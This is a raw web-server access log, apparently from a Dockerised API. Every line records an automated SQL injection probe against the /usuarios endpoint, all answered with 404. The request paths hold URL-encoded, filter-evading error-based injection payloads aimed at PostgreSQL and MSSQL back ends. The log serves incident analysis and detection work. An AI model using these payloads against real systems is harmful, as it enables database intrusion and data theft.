api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:59462 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/9720%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289720%3D9720%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%286505%3D6505 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59478 - "GET /usuarios/%2A%2A/AND/%2A%2A/9720%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289720%3D9720%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59486 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/9720%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289720%3D9720%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%28%27kEJa%27%3D%27kEJa HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59498 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/9720%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289720%3D9720%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%27GmlR%27%3D%27GmlR HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59506 - "GET /usuarios/%2A%2A/AND/%2A%2A/9720%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289720%3D9720%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29--/%2A%2A/BpUP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59522 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/5368/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285368%3D5368%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%283201%3D3201 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59532 - "GET /usuarios/%2A%2A/AND/%2A%2A/5368/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285368%3D5368%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59554 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/5368/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285368%3D5368%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%28%27ltJm%27%3D%27ltJm HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59566 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/5368/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285368%3D5368%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%27fwCL%27%3D%27fwCL HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59572 - "GET /usuarios/%2A%2A/AND/%2A%2A/5368/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%285368%3D5368%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--/%2A%2A/LCCv HTTP/1.1" 404 Not Found
